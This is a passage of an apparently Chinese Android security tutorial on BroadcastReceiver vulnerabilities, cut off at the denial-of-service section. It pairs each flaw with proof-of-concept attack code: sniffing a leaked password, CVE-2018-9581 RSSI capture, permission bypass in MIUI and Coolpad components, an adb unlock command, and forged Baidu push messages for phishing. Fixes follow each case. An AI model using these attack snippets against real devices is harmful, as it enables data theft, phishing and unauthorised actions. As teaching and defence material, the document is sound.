class="line">系统启动完成后(仅广播一次)Intent.ACTION_BOOT_COMPLETED</span><br><span class="line">按下照相时的拍照按键(硬件按键)时Intent.ACTION_CAMERA_BUTTON</span><br><span class="line">屏幕锁屏Intent.ACTION_CLOSE_SYSTEM_DIALOGS</span><br><span class="line">设备当前设置被改变时(界面语言、设备方向等)Intent.ACTION_CONFIGURATION_CHANGED</span><br><span class="line">插入耳机时Intent.ACTION_HEADSET_PLUG</span><br><span class="line">未正确移除SD卡但已取出来时(正确移除方法:设置--SD卡和设备内存--卸载SD卡)Intent.ACTION_MEDIA_BAD_REMOVAL</span><br><span class="line">插入外部储存装置（如SD卡）Intent.ACTION_MEDIA_CHECKING</span><br><span class="line">成功安装APKIntent.ACTION_PACKAGE_ADDED</span><br><span class="line">成功删除APKIntent.ACTION_PACKAGE_REMOVED</span><br><span class="line">重启设备Intent.ACTION_REBOOT</span><br><span class="line">屏幕被关闭Intent.ACTION_SCREEN_OFF</span><br><span class="line">屏幕被打开Intent.ACTION_SCREEN_ON</span><br><span class="line">关闭系统时Intent.ACTION_SHUTDOWN</span><br><span class="line">重启设备Intent.ACTION_REBOOT</span><br><span class="line">注：当使用系统广播是，只需要在注册广播接收者时定义相关的action即可，并不需要手动发送广播，当系统有相关操作时会自动进行系统广播</span><br></pre></td></tr></table></figure><p><strong>有序广播：</strong></p><p>发送出去的广播被广播接收者按照先后顺序接收 有序是针对广播接收者而言的。广播接收者接收广播的顺序规则（同时面向静态和动态注册的广播接收者）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）按照Priority属性值从大-小排序</span><br><span class="line">（2）Priority属性相同者，动态注册的广播优先</span><br></pre></td></tr></table></figure><p>特点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）接收广播按顺序接收</span><br><span class="line">（<span class="number">2</span>）先接收的广播接收者可以对广播进行截断，即后接收的广播接收者不在接收此广播，可以使用abortBroadcast()方法</span><br><span class="line">（<span class="number">3</span>）先接收的广播接收者可以对广播进行修改，那么后接收的广播接收者将接收到被修改后的广播</span><br></pre></td></tr></table></figure><p>具体使用：有序广播的使用过程与普通广播非常类似，差异仅在于广播的发送方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendOrderedBroadcast(intent,<span class="literal">null</span>); <span class="comment">//参数1：接收的Intent 参数2：与权限相关字符串，一般为null</span></span><br></pre></td></tr></table></figure><p><strong>App应用内广播（Local Broadcast）：本地广播</strong></p><p>产生的原因：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">由于Android中的广播可以跨App直接通信（exported对于有intent-filter情况下默认值为<span class="literal">true</span>）</span><br><span class="line">导致可能会出现的问题：</span><br><span class="line">（<span class="number">1</span>）其他App针对性发出与当前App intent-filter相匹配的广播，由此导致当前App不断接收广播并处理</span><br><span class="line">（<span class="number">2</span>）其他App注册与当前App一致的intent-filter用于接收广播，获取广播的具体星系，会出现安全性和效率性问题</span><br><span class="line">解决方案：</span><br><span class="line">使用App应用内广播（Local Broadcast）</span><br><span class="line">(<span class="number">1</span>)App应用内广播壳理解为一种局部广播，广播的发送者和接收者都同属于一个App</span><br><span class="line">(<span class="number">2</span>)相比于全局广播（普通广播），App应用内广播优势体现在：安全性高和效率高</span><br></pre></td></tr></table></figure><p>实现步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">方法<span class="number">1</span>：</span><br><span class="line">将全局广播设置为局部广播</span><br><span class="line">（<span class="number">1</span>）注册广播是将exported属性设置为<span class="literal">false</span>，使得非本App内部发出的此广播不被接收</span><br><span class="line">（<span class="number">2</span>）在广播的发送和接收时，增设相应权限permission，用于权限验证</span><br><span class="line">（<span class="number">3</span>）发送广播时指定该广播接收器所在的包名，此广播将只会发送到此包中的App内与之相匹配的有效广播接收器中</span><br><span class="line">通过intent.setPackage(packageName)指定包名</span><br><span class="line"></span><br><span class="line">方法<span class="number">2</span>：</span><br><span class="line">使用封装好的LocalBroadcastManager类使用方式上与全局广播几乎相同，只是注册/取消注册广播接收器和发送广播时将参数context变成LocalBroadcastManager的单一实例。</span><br><span class="line">注意：对于LocalBroadcastManager方式发送的应用内广播，只能通过LocalBroadcastManager动态注册，不能静态注册</span><br></pre></td></tr></table></figure><p>方法2的具体实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注册应用内广播接收器</span></span><br><span class="line"><span class="comment">//步骤1：实例化BroadcastReceiver子类 &amp; IntentFilter mBroadcastReceiver </span></span><br><span class="line">mBroadcastReceiver = <span class="keyword">new</span> <span class="title class_">mBroadcastReceiver</span>(); </span><br><span class="line"><span class="type">IntentFilter</span> <span class="variable">intentFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤2：实例化LocalBroadcastManager的实例</span></span><br><span class="line">localBroadcastManager = LocalBroadcastManager.getInstance(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤3：设置接收广播的类型 </span></span><br><span class="line">intentFilter.addAction(android.net.conn.CONNECTIVITY_CHANGE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//步骤4：调用LocalBroadcastManager单一实例的registerReceiver（）方法进行动态注册 </span></span><br><span class="line">localBroadcastManager.registerReceiver(mBroadcastReceiver, intentFilter);</span><br><span class="line"></span><br><span class="line"><span class="comment">//取消注册应用内广播接收器</span></span><br><span class="line">localBroadcastManager.unregisterReceiver(mBroadcastReceiver);</span><br><span class="line"></span><br><span class="line"><span class="comment">//发送应用内广播</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(BROADCAST_ACTION);</span><br><span class="line">localBroadcastManager.sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>这里我们就完成了开发人员手动完成部分，就成功实现了Android的广播机制，后续就是系统自动完成了</p><p>最后我们关注一些不同注册方式的广播接收器回调onReceive()中的context返回值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对于静态注册（全局+应用内广播），回调onReceive(context,intent)中的context返回值是：ReceiverRestrictedContext</span><br><span class="line">对于全局广播的动态注册，回调onReceive(context, intent)中的context返回值是：Activity Context；</span><br><span class="line">对于应用内广播的动态注册（LocalBroadcastManager方式），回调onReceive(context, intent)中的context返回值是：Application Context</span><br><span class="line">对于应用内广播的动态注册（非LocalBroadcastManager方式），回调onReceive(context, intent)中的context返回值是：Activity Context</span><br></pre></td></tr></table></figure><h3 id="2-Broadcast-Reciver漏洞的种类和危害"><a href="#2-Broadcast-Reciver漏洞的种类和危害" class="headerlink" title="2.Broadcast Reciver漏洞的种类和危害"></a>2.Broadcast Reciver漏洞的种类和危害</h3><p>Broadcast Reciver漏洞大致可以分为：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/8.png" alt="image-20210912155436267"></p><p>Broadcast Reciver漏洞的危害：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BroadcastReceiver是四大组件之一，这个组件涉及：广播发送者和广播接收者，这里的广播实际上指的是intent当发送一个广播是，系统会将发送的广播(intent)与系统中所有注册的符合条件的接IntentFilter进行匹配，匹配成功，则执行相应的onReceive函数</span><br><span class="line">发送广播时，如果处理不当，恶意应用便可以嗅探，拦截广播，致使敏感数据泄露，接收广播时处理不当，便会导致拒绝服务攻击、伪造消息、越权操作等</span><br></pre></td></tr></table></figure><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/9.png" alt="image-20210912155436267"></p><h2 id="三、Broadcast-Reciver漏洞原理分析和复现"><a href="#三、Broadcast-Reciver漏洞原理分析和复现" class="headerlink" title="三、Broadcast Reciver漏洞原理分析和复现"></a>三、Broadcast Reciver漏洞原理分析和复现</h2><h3 id="1-敏感信息泄漏漏洞"><a href="#1-敏感信息泄漏漏洞" class="headerlink" title="1.敏感信息泄漏漏洞"></a>1.敏感信息泄漏漏洞</h3><h4 id="（1）原理介绍"><a href="#（1）原理介绍" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发送的intent没有明确指定接收者，而是简单的通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：</p><p>我们发现一个目标程序段代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">d</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    v1.setAction(<span class="string">&quot;com.sample.action.server_running&quot;</span>);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;local_ip&quot;</span>,v0.h);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;port&quot;</span>,v0.i);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;code&quot;</span>,v0.g);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;connected&quot;</span>,v0.s);</span><br><span class="line">    v1.putExtra(<span class="string">&quot;pwd_predefined&quot;</span>,v0.r);</span><br><span class="line">    <span class="keyword">if</span>(!TextUtils.isEmpty(v0.t))&#123;</span><br><span class="line">        v1.putExtra(<span class="string">&quot;connected_usr&quot;</span>,v0.t);</span><br><span class="line">    &#125;</span><br><span class="line">    sendBroadcast(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过分析得出，该程序通过intent隐式传递，并通过action匹配发送一个广播，这样系统内其他程序都可以接收到这个广播，然后在广播接收者中编写接收代码，这样我们可以编写攻击代码获取敏感数据信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span>(intent.getAction().equals(<span class="string">&quot;com.sample.action.server_running&quot;</span>))&#123;</span><br><span class="line">        String pwd=intent.getStringExtra(<span class="string">&quot;connected&quot;</span>);</span><br><span class="line">        s=<span class="string">&quot;Airdroid =&gt; [&quot;</span>+pwd+<span class="string">&quot;]/&quot;</span>+intent.getExtras();</span><br><span class="line">    &#125;</span><br><span class="line">    Toast.makeTest(context,String.format(<span class="string">&quot;%sReceived&quot;</span>,s),Toast.LENGTH_SHORT).show();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们就可以通过广播获取该程序的密码</p><p><strong>修复：</strong></p><p>我们尝试采用本地广播的方式，这样程序发出的广播就只能被app自身广播接收器接收</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;my-sensitive-event&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;event&quot;</span>,<span class="string">&quot;this is a test event&quot;</span>);</span><br><span class="line">LocalBroadcastManager.getInstance(<span class="built_in">this</span>).sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>案例2：<a href="https://wwws.nightwatchcybersecurity.com/2018/11/11/cve-2018-9581/">Android 操作系统中通过 RSSI 广播暴露敏感数据 （CVE-2018-9581)</a></p><p>漏洞详情：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Android操作系统会定期在系统范围内广播WiFI强度值（RSSI）,RSSI值表示设备接收到的信号</span><br><span class="line">的相对强度（更高=更强），但与实际物理强度dBm没有直接关系，这是通过两个独立的intents实现的，Android <span class="number">9</span>之前是android.net.wifi.STATE_CHANGE，其他安卓设备是android.net.wifi.RSSI_CHANGED</span><br><span class="line">当应用通过WifiManager访问信息时，正常就在应用manifest中请求ACCESS_WIFI_STATE权限。因为WiFi RTT特征是Android <span class="number">9</span>中新引入的，也是用于位置定位的，需要ACCESS_FINE_LOCATION权限。但监听系统广播时，</span><br><span class="line">在不需要通知用户，不需要其他权限的情况下就可以获取信息</span><br><span class="line">存在的安全问题：</span><br><span class="line">（<span class="number">1</span>）RSSI值是通过广播获取的，绕过的正常的权限检查（ACCESS_WIFI_STATE）</span><br><span class="line">（<span class="number">2</span>）通过广播或WiFimanager获取的RSSI值可以在不需要其他位置权限的情况下进行室内定制</span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle state)</span> &#123;</span><br><span class="line">    <span class="type">IntentFilter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();        </span><br><span class="line">    filter.addAction(android.net.wifi.STATE_CHANGE);</span><br><span class="line">    filter.addAction(android.net.wifi.RSSI_CHANGED);</span><br><span class="line">    registerReceiver(receiver, filter);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="type">BroadcastReceiver</span> <span class="variable">receiver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BroadcastReceiver</span>() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Log.d(intent.toString());</span><br><span class="line">    ….</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>测试步骤：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）安装Broadcast Monitor app；</span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）将手机设置为飞行模式；</span><br><span class="line"></span><br><span class="line">（<span class="number">3</span>）进入房间；</span><br><span class="line"></span><br><span class="line">（<span class="number">4</span>）关掉飞行模式，以触发RSSI广播；</span><br><span class="line"></span><br><span class="line">（<span class="number">5</span>）从以下广播中获取RSSI值：</span><br><span class="line">android.net.wifi.RSSI_CHANGE – newRssi value</span><br><span class="line">android.net.wifi.STATE_CHANGE – networkInfo / RSSI</span><br><span class="line"></span><br><span class="line">（<span class="number">6</span>）重复步骤<span class="number">3</span>-<span class="number">4</span>。</span><br></pre></td></tr></table></figure><p>我们可以利用广播接收者获取广播中的敏感信息RSSI值</p><h3 id="2-权限绕过漏洞"><a href="#2-权限绕过漏洞" class="headerlink" title="2.权限绕过漏洞"></a>2.权限绕过漏洞</h3><h4 id="（1）原理介绍-1"><a href="#（1）原理介绍-1" class="headerlink" title="（1）原理介绍"></a>（1）原理介绍</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可以通过两种方式注册广播接收器，一种是在AndroidManifest.xml文件中通过&lt;receiver&gt;标签静态注册，另一种是通过Context.registerReceiver()动态注册，指定相应的intentFilter参数，动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现-1"><a href="#（2）漏洞复现-1" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2012-09175.html">小米MIUI漏洞可能导致硬件资源消耗</a></p><p>漏洞详情：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MIUI内置的手电筒软件Stk.apk中，TorchService服务没有对广播来源进行验证，导致任何程序可以调用这个服务，打开或关闭手电筒，利用这个漏洞，可以导致系统电源迅速消耗</span><br></pre></td></tr></table></figure><p>漏洞攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;net.cactii.flash2.TOGGLE_FLASHLIGHT&quot;</span>);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>我们这里就是通过intent隐私传递，发送广播，然后匹配小米应用中的action，这样就可以打开或广播手电筒，从而利用这个漏洞，导致系统电源迅速消耗</p><p><strong>修复：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">三种方法：</span><br><span class="line"><span class="number">1.</span> 在AndroidManifest.xml中，将TorchService申明为export=<span class="string">&quot;false&quot;</span>的；</span><br><span class="line"><span class="number">2.</span> 在AndroidManifest.xml中，申明一个私有权限，级别为signature，并为TorchService申明需要这个权限；</span><br><span class="line"><span class="number">3.</span> 在TorchService的实现代码中，检查Intent的来源是否Stk.apk自身。</span><br></pre></td></tr></table></figure><p>案例2：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084520.html">酷派最安全手机s6拨打电话权限绕过</a></p><p>漏洞详情：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">酷派最安全手机s6拨打电话权限绕过，第三方app可以无需拨打电话权限直接拨打电话</span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;com.android.phone&quot;</span>,<span class="string">&quot;com.android.phone.PhoneGlobals$NotificationBroadcastReceiver&quot;</span>));</span><br><span class="line">intent.setAction(<span class="string">&quot;com.android.phone.ACTION_CALL_BACK_FROM_NOTIFICATION&quot;</span>);</span><br><span class="line">intent.setData(Uri.parse(<span class="string">&quot;tel:10000&quot;</span>));</span><br><span class="line">intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">sendBroadcast(intent);</span><br></pre></td></tr></table></figure><p>通过intent启动外部电话应用，匹配action，并授权标志位，这样就可以不用获取权限，就可以打电话</p><p>修复：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）使用本地广播</span><br><span class="line">（2）对广播的action进行判别</span><br></pre></td></tr></table></figure><p>案例3：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-084516.html">酷派最安全手机s6程序锁绕过</a></p><p>漏洞详情：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序加锁解锁是靠广播来控制的，并且这两条广播没做权限限制，任意应用可以发送此广播达到恶意解锁、恶意锁定应用的目的</span><br></pre></td></tr></table></figure><p>漏洞测试：</p><p>  简单测试方法用adb shell 发送广播，用来解锁  </p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/10.png" alt="image-20210912155436267"></p><p>然后使用命令行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am broadcast -a android.intent.action.PACKAGE_FULLY_REMOVED -d <span class="keyword">package</span>:com.wumii.android.mimi</span><br></pre></td></tr></table></figure><p>就可以成功解锁：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0011/11.png" alt="image-20210912155436267"></p><p><strong>修复：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">推荐使用呢LocalBroadcastManager类,这个类相较于Context.sendBroadcast(intent)有下面三方面的优势：</span><br><span class="line"><span class="number">1.</span>不用担心敏感数据泄露，通过这种方式发送的广播只能应用内接收。</span><br><span class="line"><span class="number">2.</span>不用担心安全漏洞被利用，因为其他应用无法发送恶意广播给你。</span><br><span class="line"><span class="number">3.</span>它比系统的全局广播更高效。</span><br></pre></td></tr></table></figure><h3 id="3-消息伪造"><a href="#3-消息伪造" class="headerlink" title="3.消息伪造"></a>3.消息伪造</h3><h4 id="（1）漏洞介绍"><a href="#（1）漏洞介绍" class="headerlink" title="（1）漏洞介绍"></a>（1）漏洞介绍</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患</span><br></pre></td></tr></table></figure><h4 id="（2）漏洞复现-2"><a href="#（2）漏洞复现-2" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h4><p>案例1：<a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-039801.html">百度云盘手机版钓鱼、信息泄露和代码执行高危漏洞三合一</a></p><p>漏洞描述：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度云盘手机版存在高危漏洞，恶意攻击者通过该漏洞可以对手机用户进行钓鱼欺骗，盗取用户隐私文件和信息，以百度云盘APP权限执行任何代码。百度云盘有一个广播接收器没有对消息进行安全验证，通过发送恶意的消息，攻击者可以在用户手机通知栏上推送任意消息，点击消息后可以利用webview组件盗取本地隐私文件和执行任意代码。</span><br><span class="line">   存在漏洞的组件是：com.baidu.android.pushservice.action.MESSAGE</span><br></pre></td></tr></table></figure><p>攻击代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">  i.setAction(<span class="string">&quot;com.baidu.android.pushservice.action.MESSAGE&quot;</span>)；</span><br><span class="line">      <span class="type">Bundle</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Bundle</span>();</span><br><span class="line">      <span class="keyword">try</span> &#123; </span><br><span class="line">      <span class="type">JSONObject</span> <span class="variable">jsobject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line"> <span class="comment">//1. phishing</span></span><br><span class="line">          <span class="type">JSONObject</span> <span class="variable">custom_content_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">      jsobject.put(<span class="string">&quot;title&quot;</span>, <span class="string">&quot;百度云盘【漏洞你中奖了！】&quot;</span>);</span><br><span class="line">      jsobject.put(<span class="string">&quot;description&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      <span class="comment">//jsobject.put(&quot;url&quot;, &quot;http://bcscdn.baidu.com/netdisk/BaiduYun_5.1.0.apk&quot;);</span></span><br><span class="line">      jsobject.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;http://drops.wooyun.org/webview.html&quot;</span>);</span><br><span class="line">      <span class="type">JSONObject</span> <span class="variable">customcontent_js</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();       </span><br><span class="line">      customcontent_js.put(<span class="string">&quot;type&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      customcontent_js.put(<span class="string">&quot;msg_type&quot;</span>, <span class="string">&quot;resources_push&quot;</span>);</span><br><span class="line">      customcontent_js.put(<span class="string">&quot;uk&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">      customcontent_js.put(<span class="string">&quot;shareId&quot;</span>, <span class="string">&quot;1&quot;</span>);  </span><br><span class="line">      jsobject.put(<span class="string">&quot;custom_content&quot;</span>, customcontent_js);   </span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span>  <span class="operator">=</span> jsobject.toString();</span><br><span class="line">b.putByteArray(<span class="string">&quot;message&quot;</span>, cmd.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">设置为签名验证</span><br><span class="line">android:protectionLevel=&quot;signature&quot;</span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.umeng.message.UmengMessageBootReceiver&quot;</span> <span class="attr">android:protectionLevel</span>=<span class="string">&quot;signature&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-拒绝服务"><a href="#4-拒绝服务" class="headerlink" title="4.拒绝服务"></a>4.拒绝服务</h3><h4 